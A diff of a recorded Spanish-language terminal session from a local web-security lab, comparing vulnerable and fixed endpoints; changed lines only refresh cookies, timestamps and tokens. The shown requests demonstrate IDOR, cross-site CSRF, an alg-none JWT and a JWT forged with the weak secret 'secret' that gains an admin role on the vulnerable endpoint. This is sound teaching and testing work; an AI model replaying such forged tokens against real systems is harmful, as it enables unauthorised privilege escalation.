@@ -2,7 +2,7 @@ node v24.19.0 | curl 8.18.0 | Linux 6.18.33.2-microsoft-standard-WSL2
 
 ### login ana (vulnerable), cabecera Set-Cookie
 $ curl -s -i -c /tmp/lab-cookies -X POST http://127.0.0.1:3000/v/login -d nombre=ana -d clave=ana-clave-larga | grep -i set-cookie
-Set-Cookie: sid=afac52348cec43c637d013c25a5085ee; Path=/
+Set-Cookie: sid=74ece7c45098fc51dc0b198b6aac4012; Path=/
 
 
 ### IDOR vulnerable: ana pide la factura 3 de luis
@@ -120,7 +120,7 @@ Retry-After: 900
 
 ### cookie corregida (ana)
 $ curl -s -i -X POST http://127.0.0.1:3000/f/login -d nombre=ana -d clave=ana-clave-larga | grep -i set-cookie
-Set-Cookie: sid=i9tjx5WTN_pZhYkMEXttZEBrco9tI2bnVpRd66Ry2I8; Max-Age=7200; Path=/; Expires=Mon, 28 Sep 2026 03:43:55 GMT; HttpOnly; Secure; SameSite=Lax
+Set-Cookie: sid=iOj5jZ_RTGRBy9Mhs1YYONAezIYh0ERuXllFLBLSMRs; Max-Age=7200; Path=/; Expires=Mon, 28 Sep 2026 03:55:41 GMT; HttpOnly; Secure; SameSite=Lax
 
 
 ### CSRF vulnerable: petición desde otro sitio
@@ -133,7 +133,7 @@ $ curl -s -b /tmp/lab-cookies -H 'Sec-Fetch-Site: cross-site' -X POST http://127
 
 ### JWT: el contenido se lee sin la clave
 $ curl -s http://127.0.0.1:3000/f/token | cut -d. -f2 | base64 -d 2>/dev/null; echo
-{"sub":"ana","rol":"usuario","iat":1790559836,"exp":1790560736,"aud":"app-web","iss":"https://api.ejemplo.test"}
+{"sub":"ana","rol":"usuario","iat":1790560542,"exp":1790561442,"aud":"app-web","iss":"https://api.ejemplo.test"}
 
 
 ### JWT alg none contra jwt.decode
@@ -145,13 +145,13 @@ $ curl -s -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIi
 {"error":"jwt signature is required"}
 
 ### JWT firmado con 'secret' contra el secreto débil
-$ curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbmEiLCJyb2wiOiJhZG1pbiIsImlhdCI6MTc5MDU1OTgzNn0.6FD9zo_oUJhOpixN44cucfk-zwhof82l-0vESY8tg4w' http://127.0.0.1:3000/v2/perfil
+$ curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbmEiLCJyb2wiOiJhZG1pbiIsImlhdCI6MTc5MDU2MDU0Mn0.LitXy2osDlGRN0BoUzesBOypg7d1V1JkPp7E-YaMqbY' http://127.0.0.1:3000/v2/perfil
 {"hola":"ana","rol":"admin"}
 
 ### JWT firmado con 'secret' contra el corregido
-$ curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbmEiLCJyb2wiOiJhZG1pbiIsImlhdCI6MTc5MDU1OTgzNn0.6FD9zo_oUJhOpixN44cucfk-zwhof82l-0vESY8tg4w' http://127.0.0.1:3000/f/perfil
+$ curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbmEiLCJyb2wiOiJhZG1pbiIsImlhdCI6MTc5MDU2MDU0Mn0.LitXy2osDlGRN0BoUzesBOypg7d1V1JkPp7E-YaMqbY' http://127.0.0.1:3000/f/perfil
 {"error":"invalid signature"}
 
 ### JWT legítimo contra el corregido
-$ curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbmEiLCJyb2wiOiJ1c3VhcmlvIiwiaWF0IjoxNzkwNTU5ODM2LCJleHAiOjE3OTA1NjA3MzYsImF1ZCI6ImFwcC13ZWIiLCJpc3MiOiJodHRwczovL2FwaS5lamVtcGxvLnRlc3QifQ.no5esORzFplMvfTwXQJqRWm8-jNAI6eW2nB82vZYC5Y' http://127.0.0.1:3000/f/perfil
+$ curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbmEiLCJyb2wiOiJ1c3VhcmlvIiwiaWF0IjoxNzkwNTYwNTQyLCJleHAiOjE3OTA1NjE0NDIsImF1ZCI6ImFwcC13ZWIiLCJpc3MiOiJodHRwczovL2FwaS5lamVtcGxvLnRlc3QifQ.RgEryxcR43xUoLORYxj0_rGyQc_wDWv216-IVIk5gPo' http://127.0.0.1:3000/f/perfil
 {"hola":"ana","rol":"usuario"}
